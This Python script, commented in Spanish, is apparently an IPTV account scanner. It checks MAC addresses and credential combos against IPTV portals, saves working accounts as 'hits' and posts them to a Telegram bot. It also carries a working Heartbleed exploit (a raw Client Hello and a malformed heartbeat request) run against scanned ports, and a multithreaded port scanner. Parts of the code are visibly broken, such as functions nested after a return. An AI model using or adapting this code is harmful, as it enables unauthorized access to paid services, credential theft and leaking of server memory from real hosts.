#-----------------VARIABLES MODIFICABLES--------------------------------
import traceback

PUERTO_INICIO_SCAN=0
PUERTO_FIN_SCAN=30000
scanPORTTYPE="LOCAL" #WEB O LOCAL
#-----------------VARIABLES MODIFICABLES--------------------------------
#-----------------------------------------------------------------------
SCAN_LENTO=0
SCAN_NORMAL=1
SCAN_PORTS_LOCAL=0
SCAN_PORTS_WEB=1
DEFAULT_VULNERABLES_PORTS={8443,25463,443,2082,8081}
#NO ESTA IMPLEMENTADO LOS SERVIDORES XCI PARA ESTE API

# Modificacion Permite añadir el nick al fichero, filtrar por cadenas el hit encontrado(ej:paises)
# genera un fichero con el filtro, otros con todos los hits, y otro con las mac de los hit filtrados
# deben estar credas las carpetas combos y hits en el direcotiro raiz
import codecs
import struct
import sys
from concurrent.futures import ThreadPoolExecutor
from socket import socket, AF_INET, SOCK_STREAM

import select
from _socket import SHUT_RDWR

API_NICK_DEFAULT=""
#---------------------------Dejo esta variables aqui para usarlo como API, cuidado que estan como globale, esto es de codigo antiguo
listaMacs=[]
portalConcatString = "portal.php"
useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
realblue=""
media = 0
debug=False
version="3.9"
            #v3
                #Añadido capacidad para detectar HB vulnerabilidad
                #Añadida capacidad de scanear puertos abierto, por metodo web o local
            #v3.1
                #Añadida capacidad para copiar los objetos DataServer
            #v.3.2
                #clase m3uutil, para tratar y ordenar las funciones para listas m3u
            #v.3.3
                #eliminado intentar reproducir un canal por numero de cid, es una loteria
            #v.3.4
                #Modificada URL de solicitud de informaciona a las lista m3u, player_api
            #v3.5
                #modificado la identificación delos puertos del panel y m3u, proxies añadido
            #v3.6
                #Añadido Host a la cabecera de extracion de informacion de m3u, requerida en muchos servers
                
#---------------------------Dejo esta variables aqui para usarlo como API, cuidado que estan como globale, esto es de codigo antiguo
# mensaje para inicar la conversacion SSL
hello = ''' 
        16 03 02 00  dc 01 00 00 d8 03 02 53
        43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
        bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
        00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
        00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
        c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
        c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
        c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
        c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
        00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
        03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
        00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
        00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
        00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
        00 0f 00 01 01                                  
        '''
hb = ''' 
        18 03 02 00 03
        01 40 00
        '''

import copy
import datetime
import hashlib
import json
import os
import platform
import random
import re
import time
from datetime import date
import configparser
import pip
from os import remove
import urllib.parse
from urllib.parse import urlparse
try:
    import m3u8
except:
    pip.main(['install', 'm3u8'])
    import m3u8
try:
    import colorama
except:
    pip.main(['install', 'colorama'])
import urllib3
from colorama import Fore,Back, init
init()
try:
    import androidhelper as sl4a

    ad = sl4a.Android()
except:
    pass

try:
    import threading
except:
    pass

try:
    import requests
    import cfscrape
except:
    print("requests module not found \n requests module installing now... \n")
    pip.main(['install', 'requests'])
import requests

try:
    import sock
except:
    print("sock module not found \n sock module installing now \n")
    pip.main(['install', 'requests[socks]'])
    pip.main(['install', 'sock'])
    pip.main(['install', 'socks'])
    pip.main(['install', 'PySocks'])

try:
    import openpyxl
except:
    print("openpyxl  module not found \n xlsxwriter module installing now \n")
    pip.main(['install', 'openpyxl'])
    pip.main(['install', 'requests[openpyxl]'])
from openpyxl.styles import PatternFill
from openpyxl.worksheet.dimensions import ColumnDimension, DimensionHolder
from openpyxl.utils import get_column_letter
from openpyxl import Workbook
from openpyxl import load_workbook
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    import cfscrape

    sesq2 = requests.Session()
    ses2 = cfscrape.create_scraper(sess=sesq2)
except:
    ses2 = requests.Session()



os.system('color')
my_os = platform.system()
print("OS in my system : ", my_os)
if (my_os == "Windows"):
    rootDir = "./sdcard"  # windows. the user has to create a directoy with this name, at the same directory  that py script
else:
    rootDir = "/sdcard"  # android
# ---------------------------------fin importaciones--------------------------------------------------------------------------------------------
# ----------------------------------global vars-----------------------------------------------------------------------------------------------
menu = ""
nickn = ""
getmac = ""
oto = 0
tur = 0
Seri = ""
csay = 0
toUseProxies = False  # var to indicates connection with proxie
proxyType = 0


menu = ("""
  """+Back.RED+"""         """+Back.YELLOW+"""         """+Back.RED+"""         """+Back.RESET+"""
 ║▌█║MULTI-THREAD SCANNER ▌│║▌║   \33[0;30;5;m                                          
   🆀🆄🅴 🅽🅾 🅵🅰🆁🆃🅴 🅳🅴 🅽🅰🅰🅰🅰                  """+Fore.RESET+"""
  ___                     ___  
 (o o)                   (o o) 
(  V  ) POWERED BY SP75 (  V  )
--m-m---------------------m-m--
         """+version)

#----------------------------------------------------HB--------------------------------------------------
decode_hex = codecs.getdecoder('hex_codec')
def decoceStringToHEX(entrada):
    return decode_hex(entrada.replace(' ', '').replace('\n', ''))[0]
def hexdump(s):
    # print("*********",s)
    for b in range(0, len(s), 16):
        lin = [c for c in s[b: b + 16]]
        hxdat = ' '.join('%02X' % c for c in lin)
        pdat = ''.join(chr(c) if 32 <= c <= 126 else '' for c in lin)
        print('  %04x: %-48s %s' % (b, hxdat, pdat))
def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = b''
    try:
        remain = length
        while remain > 0:
            rtime = endtime - time.time()
            if rtime < 0:
                return None
            r, w, e = select.select([s], [], [], 5)
            if s in r:
                data = s.recv(remain)
                # EOF?
                if not data:
                    return None
                rdata += data
                remain -= len(data)
        return rdata
    except Exception as errp:
        if  (debug):
            print("recvall--->error leyendo datos del socket", errp)
        return None
def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        if debug:
            print('HDR Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        if (debug):
            print('\t\tpayload Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    # print(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay
def hit_hb(s,_url,_port):
    data = decoceStringToHEX(hb)
    s.send(data)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print('\t\tNo HB response received, server likely not vulnerable')
            return False
        if typ == 24:
            if debug:
                print('\t\tReceived HB response:')
            if (debug):
                hexdump(pay)
            if len(pay) > 3:
                puerto=str(_port)
                cadena=Fore.GREEN+'\t\t\tServer is vulnerable!-->'+_url+":"+puerto+ Fore.RESET
                print(cadena)
            else:
                print('\t\tServer processed malformed data-hello-, but did not return any extra data.')
            return True
        if typ == 21:
            print('\t\tReceived alert:')
            if (debug):
                hexdump(pay)
            print('\t\tServer returned error, likely not vulnerable')
            return False
def checkHB(_url, port: int):
    global hello
    _socket = socket(AF_INET, SOCK_STREAM)
    if (debug):
        cadena=Fore.YELLOW+"Verificando vulnerabiliad de:"+ _url+ "Puerto:"+str(port)+Fore.RESET
        print(cadena)
    try:
        _socket.connect((_url, port))
        if (debug):
            print('\t\tSending Client Hello...')
        sys.stdout.flush()
        _socket.send(decoceStringToHEX(hello))
        if (debug):
            print('\t\tWaiting for Server Hello...')
        sys.stdout.flush()
        _continue = True
        while _continue:
            typ, ver, pay = recvmsg(_socket)
            if (typ != None):
                if (debug):
                    print("Received message: type = {}, version = {}".format(typ, hex(ver)))
                    print("Verificando HB pay", pay, " pos 0:", pay[0], "--->", 0x0E)
                time.sleep(1)
                if typ == 22 and pay[0] == 0x0E:
                    if (debug):
                        print('Sending heartbeat request...')
                    sys.stdout.flush()
                    data = decoceStringToHEX(hb)
                    _socket.send(data)
                    if (hit_hb(_socket,_url,port)):
                        _socket.close()
                        return True
            else:
                _socket.close()
                if (debug):
                    print('\t\tServer closed connection without sending Server Hello.')
                _continue = False
            # Look for server hello done message.
    except Exception as errp:
        _socket.close()
        if (debug):
            print("checkHB Error:",errp)
            traceback.print_stack()
            traceback.print_exc()
        return False

    def ckeck_simple_IP_Vulnerable(_IP, puerto):
        esVulnerable = checkHB(_IP, puerto)
        return esVulnerable

    def sacarPuertos_IP(IP, _scanTYPE, _scaneoLento: bool):
        miPortScanner = PortScanner()
        listapuertos = miPortScanner.port_scan(IP, range(PUERTO_INICIO_SCAN, PUERTO_FIN_SCAN), _scanTYPE, _scaneoLento)
        return listapuertos

    def ckeck_simple_IP_Vulnerable_default_PORTS(self, _IP):
        print("Iniciando scaneo de puertos por defecto",EOF=' ')
        for puerto in DEFAULT_VULNERABLES_PORTS:
            esVulnerable = checkHB(_IP, puerto)
            if (esVulnerable):
                return puerto
        return -1

    # Metodo que verifica las ips recibida, con la lista de puertos abiertas. Recorre una lista de IP
    def check_IP_Vulnerable(_IPS: dict, _scanTYPE_ATTACK, slow_port_Scan: bool):
        listaVulnerables = {}
        for ip in _IPS:
            puertoDefectoVulnerable = ckeck_simple_IP_Vulnerable_default_PORTS(
                ip)  # primero probamos los puertos por defecto, sino busco puertos
            if puertoDefectoVulnerable == -1:
                puertos = sacarPuertos_IP(ip, _scanTYPE_ATTACK, slow_port_Scan)
                if len(puertos) > 0:
                    for puerto in puertos:
                        resultado = ckeck_simple_IP_Vulnerable(ip, puerto)
                        listaVulnerables[ip] = puerto
                        print("IP:", ip, " Puerto:", puerto, "Es vulnerable:", resultado)
                        break;  # cuando encuentro ya el puerto vulnerable paro
            else:
                listaVulnerables[ip] = puertoDefectoVulnerable

        return listaVulnerables
#----------------------------------------------------HB--------------------------------------------------
#---------------------------------------------SCANPORTS--------------------------------------------------
class PortScanner:
        header1 = {
            "Host": "www.ipfingerprints.com",
            "Connection": "keep-alive",
            "Accept": "application/json, text/javascript,*/*; q=0.01",
            "Content-Type": f"application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
            "sec-ch-ua-platform": "\"Windows\"",
            "Origin": f"https://www.ipfingerprints.com",
            "Referer": f"https://www.ipfingerprints.com/portscan.php",
            "Accept-Language": "es-US,es-419;q=0.9,es;q=0.8",
            "Accept-Encoding": "gzip, deflate"
        }

        def tratarSalidaPuertos(self, _entrada: dict):
            # primero separamos por lineas
            separada: list
            puertos = []
            cadena = _entrada['portScanInfo']
            separada = cadena.split("\n")

            for elemento in separada:
                if (elemento.find("tcp") >= 0):
                    if (elemento.find("open") >= 0):
                        pos = elemento.find("/")
                        puertos.append(int(elemento[:pos]))
            return puertos

        def createCoockiePanel(self, _host, _startport, _endport):
            coockieDat = {
                "remoteHost": _host,
                "start_port": _startport,
                "end_port": _endport,
                "normalScan": "Yes",
                "scan_type": "connect",
                "ping_type": "none"
            }
            return coockieDat

        # funcion que interroga al servicio de deteccion de puertos abiertos externos

        # funcion que interroga al servicio de deteccion de puertos abiertos externos
        # region Description

        def searchOpenPorts_WEB(self, initPort: int, finishPort: int, ipServerToScan: str):
            print(Fore.GREEN, "Scanning Ports with WEB Method:", ipServerToScan, Fore.RESET)

            parametros = self.createCoockiePanel(ipServerToScan, str(initPort), str(finishPort))
            try:
                dat = requests.post("https://www.ipfingerprints.com/scripts/getPortsInfo.php", headers=self.header1,
                                    data=parametros,
                                    timeout=300)  # si en 100 segundos no tenemos respuesta, cancelamos la consulta
                puertos = self.tratarSalidaPuertos(dat.json())
                return puertos
            except Exception as errp:
                print("Error invocando a url para detectar puertos:", errp)
                return []

        # metodo que scanea un puerto de una ip
        def test_port_number(self, host, port):
            # create and configure the socket
            with socket(AF_INET, SOCK_STREAM) as sock:
                # set a timeout of a few seconds
                sock.settimeout(5)
                # connecting may fail
                try:
                    # attempt to connect
                    sock.connect((host, port))
                    if debug:
                        cadena="\t\tPuerto encontrado para:"+ host+ ":"+ str(port)
                        print(cadena)
                    # a successful connection was made
                    sock.shutdown(SHUT_RDWR)
                    sock.close()
                    return True
                except:
                    # ignore the failure
                    sock.close()
                    return False

        def port_scan(self, host, port: range, _scanTYPE,_scaneoLento:bool):
            if _scanTYPE == SCAN_PORTS_WEB:
                return self.searchOpenPorts_WEB(port.start, port.stop, host)
            else:
                return self.test_port_numberLOCAL(host, port, _scaneoLento)

        # scanea un rango de puertos, lanzando multiples  hilos para acelerar el scaneo
        def test_port_numberLOCAL(self, host, ports, scaneLento:bool):
            print(f'\t\tScanning Ports with Local Method:{host}...')
            # create the thread pool
            totalHilos = len(ports)
            if scaneLento == True:
                totalHilos = 1
            # with ThreadPoolExecutor(len(ports)) as executor:
            with ThreadPoolExecutor(totalHilos) as executor:
                # dispatch all tasks
                # results = executor.map(self.test_port_number, [host] * len(ports), ports)
                results = executor.map(self.test_port_number, [host] * len(ports), ports)
                # report results in order
                openPorts = []
                for port, is_open in zip(ports,
                                         results):  # anlizamos los datos de cada hilo, y los devolvemos en una liusta
                    if is_open:
                        openPorts.append(port)
                if (debug):
                    print("Ports:", openPorts)
                return openPorts

#---------------------------------------------HITDATA----------------------------------------------------
# class that stores the HIT info
class HitData:
    portal = ""
    mac = ""
    url = ""
    m3uURL = ""
    user = ""
    password = ""
    caducidad = ""
    conexionesActivas = ""
    maxConexiones = ""
    timezone = ""
    playerlink = ""
    nickUser = "ABRAHAM PERUANO"
    mensaje = "  MASTER PRO  "
    livelist = ""
    vodlist = ""
    serieslist = ""
    panel = ""
    port = ""
    real = ""
    programmer = "🎓"
    vpn = ""
    accountType = "no data"
    m3uValid=""
    serial=""
    shortSerial=""
    deviceID1=""
    deviceID2=""

    def setData(self, portalName: str, nickUser: str, mac: str, url: str, m3uUrl: str, user: str, password: str,
                ficheroAsociado: str, mensaje: str, puerto: str, liveList, serieList, vodList):
        self.portal = portalName
        self.panel = portalName
        self.mac = mac
        self.url = url
        self.m3uURL = m3uUrl
        self.user = user
        self.password = password
        self.ficherosSalida = ficheroAsociado
        self.livelist = liveList
        self.vodlist = vodList
        self.serieslist = serieList
        self.port = puerto

    def __str__(self):
        output = """\n••••••••••••••••••••••••••••••••••••••••••••••••••••••••••
    \n ABRAHAM PERUANO  MASTERPRO 2023

╭─ 𝗛𝗶𝘁𝘀 ʙʏ """ + str(self.nickUser) + """   
├Panel ~ http://""" + self.panel + """
├Usuario ~ """ + self.user + """
├Password ~ """ + self.password + """
├💀Q.E.P.D. ~ """ + self.caducidad + """ 
├ARREE ~ """ + self.conexionesActivas + """
├CHEVES~ """ + self.maxConexiones + """ 
├🌍Zona ~ """ + self.timezone + """
╰─📡 M3U url \n """ + self.m3uURL
        if (self.serial != ""):
            output= output+"""
├──●🔸🖥Serial ➤""" + self.serial+"""
├──●🔸🖥SerialShort ➤""" + self.shortSerial+"""
├──●🔸🖥Device1 ➤""" +self.deviceID1+"""
├──●🔸🖥Device2 ➤""" +self.deviceID2+"""
├"""
        if (self.livelist != ""):
            output = output + """

  🧬 INFO CHANELS 🧬
  """ + str(self.livelist)
        return output

    def getSortOutput(self):
        output = """
            \n      --✩▃▂ABRAHAN PERU MP▁▂▃✩-
        ╭─➤ 𝗛𝗶𝘁𝘀 ʙʏ """ + str(self.nickUser) + """   
        ├●🔸🌐Host ➤ http://""" + self.panel + """/c/
        ├●♦️🌍Real ➤ """ + self.url + """
        ├🍁MAC 🔹""" + self.mac + """
        ├─●🔸📆Exp      ➤ """ + self.caducidad + """ 
        ├─●🔸─●🔸─●🔸""" + self.accountType + """
        ├─●🔸Country   ➤""" + self.vpn + """
        ├─●🔸M3UValid  ➤ """+self.m3uValid+"""
        ├──●🔸M3U url  ➤ """ + self.m3uURL + """
        ├─●🔸ConexMax  ➤""" +  self.maxConexiones + """
        ╰─➤●🔸Canales ➤ """ + str(self.livelist)

        return output
#---------------------------------------------SCANPORTS--------------------------------------------------
#---------------------------------------------DatosServerM3U---------------------------------------------
class DatosServerM3U:

    puertoBaseSERVER=0
    host=""
    panelM3u=""
    protocoloSERVER= "http"
    canal=""
    panelHost=""
    panelProtocolo="http"
    m3uURL=""
    panelPuerto=0
    misHeaders = {
        'Accept': '*/*',
        'Accept-Language': 'es',
        'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
        'Range': 'bytes=0-'
    }
    def printInfoServer(self):
        print("Host del panel-->", self.panelHost)
        print("Puerto del Panel--->",self.panelPuerto)
        print("Puerto del Server--->", self.puertoBaseSERVER)
        print("\tURL del panel-->",self.m3uURL)
        if self.puertoBaseSERVER==None:
            self.puertoBaseSERVER=80
        print("\tservidor final:", self.protocoloSERVER + "://" + self.host + ":" + str(self.puertoBaseSERVER))
        print("\tHost Servidor Final-->", self.host)
        print("\tServidor Final protocolo-->", self.protocoloSERVER)
        print("\tCanal utilizado-->", self.canal)

    def __str__(self):
        return self.panelProtocolo + "://" + self.panelHost + "--->" + self.protocoloSERVER + "://" + self.host + ":" + str(
            self.puertoBaseSERVER)
    #Lee la lista m3u de entrada, si tiene _plus al final lo quita, solo aceptamos ese formato
    def extraerCanalFromM3U(self,_m3u:str):
        try:
            _m3u=_m3u.replace("_plus","")
            m3u8_obj = m3u8.load(_m3u,headers=self.misHeaders)
            playlist = [el['uri'] for el in m3u8_obj.data['segments']]
            sesion = requests.Session()
            canal = playlist[50]
            return canal
        except Exception as errp:
            print(Fore.RED,"Error accediendo a la m3u(verificar que llegamos):",errp,Fore.RESET)
            return ""

    #Se le pasa una m3u como parametro, para hacer la busqueda del servidor multimedia final
    def extraerServerFinal(self,_m3uURL):
        try:
            canal=self.extraerCanalFromM3U(_m3uURL)
            self.m3uURL=_m3uURL
            if canal!="":
                panelParser=urlparse(_m3uURL)
                self.panelHost=panelParser.netloc.split(":")[0] #si tiene puerto se lo quito
                self.panelProtocolo=panelParser.scheme
                self.panelPuerto=panelParser.port
                sesion=requests.Session()
                respuesta = sesion.get(url=canal, stream=False, allow_redirects=False)
                self.canal=canal
                if 'Location' in respuesta.headers:
                    miparser=urlparse(respuesta.headers["Location"])
                    self.panelM3u=_m3uURL
                    self.host=miparser.hostname
                    self.puertoBaseSERVER=miparser.port
                    self.protocoloSERVER=miparser.scheme
                    return self
            #no tiene redireccion, para los datos directos de la m3u o es una ip solo
            miparser = urlparse(_m3uURL)
            self.panelM3u = _m3uURL
            if miparser.hostname==None:
                self.host=_m3uURL
                self.panelHost = _m3uURL
            else:
                self.host = miparser.hostname
                self.panelHost = miparser.hostname
            if miparser.port==None:
                self.puertoBaseSERVER=80
                self.panelPuerto=80
            else:
                self.puertoBaseSERVER = miparser.port
                self.panelPuerto= miparser.port
            if miparser.scheme==None:
                self.panelProtocolo = ""
                self.protocoloSERVER = ""
            else:
                self.panelProtocolo=miparser.scheme
                self.protocoloSERVER=miparser.scheme
            return self
        except Exception as errp:
            print("Error:",errp)

    def __eq__(self, other):
        return self.m3uURL == other.m3uURL

    def __gt__(self, other):
        return self.m3uURL > other.m3uURL



# ----------------------------------end global vars-----------------------------------------------------------------------------------------------
#---------------------------------------------BotSenderData---------------------------------------------
# Clase para envio de mensajes a bots de telegram
class BotSenderData:
    tokenBot: str
    chatId: str
    cadenaEnvio: str
    urlGenerica = "https://api.telegram"
    urlSalida = ""
    doTelegramBot= False
    nonmbreFicheroTelegram = "botconfig.ini"

    def setData(self, toketBot, chatID):
        self.tokenBot = toketBot
        self.chatId = chatID
        self.urlGenerica = self.urlGenerica.replace("@TOKENBOT", toketBot)
        self.urlGenerica = self.urlGenerica.replace("@CHATID", chatID)
    def setFileConfigData(self,nombreFichero:str):
        self.nonmbreFicheroTelegram=nombreFichero
    # verifica que exista el fichero de configuracion del bot, sino existe ignora la ejecución de envio de mensajes a un chat
    def loadBOTData(self):
        try:
            if os.path.exists(self.nonmbreFicheroTelegram):
                with open(self.nonmbreFicheroTelegram, 'r') as json_file:
                    config = configparser.ConfigParser()
                    config.read(self.nonmbreFicheroTelegram, 'UTF-8')
                    self.tokenBot = config['botdata']['tokenbot']
                    self.chatId = config['botdata']['chatid']
                    self.doTelegramBot = True
                self.urlGenerica = self.urlGenerica.replace("@TOKENBOT", self.tokenBot)
                self.urlGenerica = self.urlGenerica.replace("@CHATID", self.chatId)
                return True
        except Exception as errp:
            print("Error reading bootconfig data:" + errp)
            return False

    # https://api.telegram.org
    def sendMessage(self, textoToSend: str):
        # print("Sending to bot")
        try:
            sesq = requests.Session()
            cadena: str
            cadena = textoToSend[:4090]+" !*!*!" #tamaño maximo de los menajes de telegram 4096
            if cadena!=None:
                url = self.urlGenerica.replace("@TEXT", urllib.parse.quote_plus(bytearray(str(cadena).encode())))
                res = sesq.get(url, timeout=10, verify=False) #controlar error 404, mensaje demasiado largo
                if (res.status_code>=400):
                    print("Error enviado datos a telegram:",res.text)
                    return False
                return True
        except Exception as errp:
            print("error enviando al bot:" , errp)
        return False


# clase que guarda el avance del scan de un portal, por si se para la ejecución o se bloque el sistema
class BackupScanData:
    config = configparser.ConfigParser()
    macsTorecord = 30  # numero para indicar cada cuantas mac grabar. ahora se graba bajo demanta

    # verifica la existencia del fichero de restauración
    def verifyRestoreFile(self):
        return os.path.exists("restore.ini")

    def readServerData(self):
        self.config.read('restore.ini', 'UTF-8')

    def writeServerData(self):
        with open('restore.ini', 'w') as json_file:
            json.dump(self.dataServer, json_file)
            json.dump(self.dataServer, json_file)

    def updateServerInfo(self, serverName: str, pos: int, filtro: str, executorName: str, preMsg: str, comboFile: str,
                         botNumer: str):
        self.config['general'] = {}
        self.config['general']['ExecutorName'] = executorName
        self.config['general']['preMessageOutputfile'] = preMsg
        self.config['general']['comboFile'] = comboFile
        self.config['general']['Bots'] = str(botNumer)
        self.config[serverName] = {}
        self.config[serverName]['PosicionMacs'] = str(pos)
        self.config[serverName]['Filtro'] = str(filtro)
        with open('restore.ini', 'w', encoding='utf-8') as configfile:
            self.config.write(configfile)

    def serverRestoreData(self):
        return (self.config.sections())[1:]  # elimino la etiqueta general

    def deleteData(self):
        for aux in self.config.sections():
            self.config.remove_section(aux)

class InfoServer:
    lista_puertosIP:dict
    host:str
    listaDNS:dict
    canalesM3U=""
    def __init__(self):
        self.lista_puertosIP=dict()
        self.listaDNS=dict()

# check the combo and hit paths directories
def checkDirestories():  # each os has its own path
    if os.path.exists(rootDir + "/combo") == False:
        os.mkdir(rootDir + "/combo")
    if os.path.exists(rootDir + "/hits") == False:
        os.mkdir(rootDir + "/hits")
    if os.path.exists(rootDir + "/proxies") == False:
        os.mkdir(rootDir + "/proxies")
#---------------------------------------------M3U_UTILS--------------------------------------------------
class M3U_UTILS:
    HEADER1_M3U = {
        "Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
    }
    def getHeaderM3U_withHOST(self,host):
        HEADER1_m3u = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip,deflate",
            "Accept-Language": "es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Connection": "keep-alive",
            "Host": host,
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76"
        }
        return HEADER1_m3u
    #Metodo que extrae los campos de una peticion de info a una m3u de los datos del usuarios
    def extractDataFromList(self,user: str, passw: str, reponseMessage: str, panel: str, hitData: HitData):
        try:
            hitData.panel = panel
            hitData.user = user
            hitData.password = passw
            acon = ""
            acon = reponseMessage.split('active_cons":')[1]
            acon = acon.split(',')[0]
            acon = acon.replace('"', "")
            hitData.conexionesActivas = acon
            mcon = reponseMessage.split('max_connections":')[1]
            mcon = mcon.split(',')[0]
            mcon = mcon.replace('"', "")
            hitData.maxConexiones = mcon
            timezone = reponseMessage.split('timezone":"')[1]
            timezone = timezone.split('",')[0]
            timezone = timezone.replace("\/", "/")
            hitData.timezone = timezone
            realm = reponseMessage.split('url":')[1]
            realm = realm.split(',')[0]
            realm = realm.replace('"', "")
            hitData.real = realm
            port = reponseMessage.split('port":')[1]
            port = port.split(',')[0]
            port = port.replace('"', "")
            hitData.port = port
            timeInfo = reponseMessage.split('exp_date":')[1]
            timeInfo = timeInfo.split(',')[0]
            timeInfo = timeInfo.replace('"', "")
            if timeInfo == "null":
                hitData.caducidad = "Unlimited"
            else:
                hitData.caducidad = (datetime.datetime.fromtimestamp(int(timeInfo)).strftime('%Y-%m-%d %H:%M:%S'))
            hitData.outputFormats = (reponseMessage.split('allowed_output_formats":')[1]).split('}')[0]
        except Exception as err:
            print("error extrayendo lista de canales:", err)

    #creamos la url para solicitar la lista y devolvemos la invocacion a la url, que sera la lista de canales
    def extractChannelListM3U_FromUSER_PASS(self, panel, user, passw):
        url="http://" + panel + "/player_api.php?username=" + user + "&password=" + passw + "&action=get_live_categories"
        print("Extrayendo lista de canales-->",url)
        try:
            ses=requests.session()
            res = ses.get(url, headers=self.getHeaderM3U_withHOST(panel), timeout=15, verify=False)
            return self.createChannelList(str(res.text))
        except Exception as errp:
            return "Error creando canales:",errp

    #crea una lista de los canales recibidos
    def createChannelList(self, listlink):
        # si existen varios datos de canales, creo una lista
        canal = ""
        categoria = ""
        if listlink.count('category_name":"') > 1:
            for i in listlink.split('category_name":"'):
                try:
                    canal = str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/', '/').replace(
                        '{', '').replace('[', '')
                except:
                    canal = ""
                categoria = categoria + canal + "🏌️"
            return categoria
        else:
            return "<<no_data>>"
# ---------------------------------------------M3U_UTILS--------------------------------------------------

# Definition of the different header types
def url(cid, panel, portalConcatString, mac):
    url7 = "http://" + panel + "/" + portalConcatString + "?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/" + str(
        cid) + "_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml&mac=" + mac
    return url7

def separarUserPass(entrada:str):
    try:
        protocolo="http"
        if (entrada.find("https"))>=0:
            protocolo="https"
        entrada = entrada.replace("/", "")
        separador = "get.php"
        separado = entrada.split(separador)
        url = separado[0].replace("https:", "")
        url = url.replace("http:", "")
        separador = "username="
        separado = entrada.split(separador)
        separado = separado[1].split("password=")
        user = separado[0].replace("&","")
        separado = separado[1].split("&")
        password = separado[0]
        return protocolo,url,user, password
    except:
        return ""


#metodo que verifica una url entera formato m3u con user y pass, le paso un id de canal que debe existir, no es extraer el servidor multimedia
def checkFullM3U_URL(entradaURL:str,_session):
    protocolo,url,user,passw=separarUserPass(entradaURL)
    urlEntrada=url
    #check real url for play a channel
    urlPlayerInfo = "http://" + url + "/player_api.php?username=" + str(user) + "&password=" + str(passw)
    print("Intentado sacar info de:",urlPlayerInfo)
    try:
        res = _session.get(urlPlayerInfo, headers=hea3(url), timeout=(2, 10), allow_redirects=False, stream=True)
        if res.status_code==200:
            datos=json.loads(res.text)
            if (datos["user_info"]["auth"]==0):
                return "KO","","",""
            urlReal=datos["server_info"]["url"]+":"+datos["server_info"]["port"]
            urlReal=urlReal.replace("https://","")
            urlReal = urlReal.replace("http://", "")
            url=urlReal
            puerto=datos["server_info"]["port"]
            return "OK","","",""
        else:
            return "KO","","",""
    except Exception as errp:
        print("error intentado accedes al servidor como m3u:",errp)
        return "KO", "", "", ""

#valida la m3u si funciona
